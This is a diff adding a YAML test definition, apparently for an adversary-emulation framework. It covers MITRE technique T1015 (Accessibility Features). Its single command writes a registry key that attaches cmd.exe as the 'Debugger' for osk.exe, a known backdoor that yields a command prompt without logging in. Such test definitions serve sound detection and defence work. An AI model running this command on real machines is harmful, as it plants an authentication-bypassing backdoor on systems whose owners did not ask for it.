@@ -1,0 +1,21 @@
+---
+attack_technique: T1015
+display_name: Accessibility Features
+
+atomic_tests:
+- name: Attaches Command Prompt As Debugger To Process
+  description: |
+    This allows adversaries to execute the attached process
+
+  supported_platforms:
+    - windows
+  input_arguments:
+    target_executable:
+      description: File You Want To Attach To
+      type: String
+      default: osk.exe
+
+  executor:
+    name: command_prompt
+    command: |
+      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
